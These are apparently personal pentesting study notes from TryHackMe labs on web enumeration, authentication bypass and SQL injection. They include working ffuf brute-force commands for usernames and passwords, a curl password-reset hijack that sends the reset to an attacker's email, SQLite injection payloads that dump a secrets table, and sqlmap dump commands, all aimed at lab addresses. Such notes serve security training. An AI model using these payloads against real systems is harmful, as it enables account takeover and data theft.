# R

* Remember for web/general/security

<hr class="sep-both">

## OWASP

* https://owasp.org/www-project-top-ten/
* Juiceshop
* https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
* https://github.com/OWASP/wstg
* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
* https://github.com/OWASP/CheatSheetSeries
* https://www.zaproxy.org/
* https://github.com/OWASP/Amass

<hr class="sep-both">

## enum4linux

![Usage: Enumerating Information](https://img.shields.io/badge/usage-Enumerating%20Information-ffd700)

I don't know if there is still an `enum.exe`, because I can't find it, but you can use the tool [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) for enumerating information from Windows, and Samba hosts.

```bash
$ ./enum4linux.pl <options> <ip>
# -U : list of users
# -M : list of devices
# -S : list of shares
# -o : os data
# -i : printer data
# -v : verbose
```

<hr class="sep-both">

# Notes

* https://tryhackme.com/resources/blog/online-training-for-careers
* https://tryhackme.com/resources/blog/cyber-security-awareness-month
* There are websites on the Internet that allow you to check the reputation of an IP address to see whether it's malicious or suspicious.
  * AbuseIPDB
  * Cisco Talos Intelligence
* https://www.virustotal.com/gui/home/upload
* https://www.hybrid-analysis.com/
* https://otx.alienvault.com/ (An open-source threat tracking system)

<hr class="sep-both">

# Learn again

* netdiscover
* https://www.sans.org/cyberaces/
* https://crackstation.net/
* echo xxx name >> /etc/hosts 
* nmap xxx
  * Service Info: Host: Os:
* https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388

<hr class="sep-both">

# Web

**Subdomain** enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability.

* Brute Force
  * https://www.kali.org/tools/dnsrecon/ & https://github.com/darkoperator/dnsrecon
  * dnsrecon -t brt -d xxx.thm
* OSINT (Open-Source Intelligence)
  * https://crt.sh/
  * https://ui.ctsearch.entrust.com/ui/ctsearchui
  * -site:www.domain.com site:*.domain.com
  * Sublist3r https://github.com/aboul3la/Sublist3r
* Virtual Host
  * /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users)
  * Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header.
  * `ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.126.102 -fs 2395`
  * The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.
  * Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value
* Errors in web application
  * ex: signin username taken
    * ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.136.157/customers/signup -mr "username already exists"
    * -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type to the webserver knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we've found a valid username.
    * ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.136.157/customers/login -fc 200
    * we have to specify our own FUZZ keyword. In this instance, we've chosen W1
    * -fc code: filter codes that are not code
* Logic Flaw
  * when someone (hacker or any) take a path different than intended
  * $_REQUEST=$_GET+$_POST. If both have a key, then post is used.
  * GET url with non-injectable parameter (verified)
  * POST URL in which you can override the value of the non-injectable parameter
  * curl 'http://10.10.136.157/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=hacker@hack.ca'
  * Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.
  * https://crackstation.net/
  * https://www.base64encode.org/
  * Cookies (encoded/raw/ff)
  * https://tryhackme.com/room/authenticationbypass
  * https://tryhackme.com/room/subdomainenumeration

<hr class="sep-both">

# SQL

* Input Box String: usual
* Input Box Non-String: when there is no quotes: `'' OR 1=1-- -`
* If you have trouble via a form (client-side verification) intercept the request
* Look into the field name to guess column names
* Update
  * none',nickName='lol
* Version
  * (SELECT banner FROM v$version)
  * sqlite_version()
    * SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
    * ',nickName=(SELECT group_concat(tbl_name, '<br>') FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
    * ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
    * ',nickName=(SELECT group_concat(id || ":" || author || ":" || secret, '<br>') FROM secrets),email='
* https://www.kirsle.net/wizards/flask-session.cgi
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin"
  --level=5 --risk=3 --dbms=sqlite --technique=b --dump
* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump --threads 10
* https://tryhackme.com/room/sqlilab
* See tamper script

<hr class="sep-both">

## Burp

* take a request captured in the Proxy, edit it, and send the same request repeatedly as many times as we wish
* tabs per request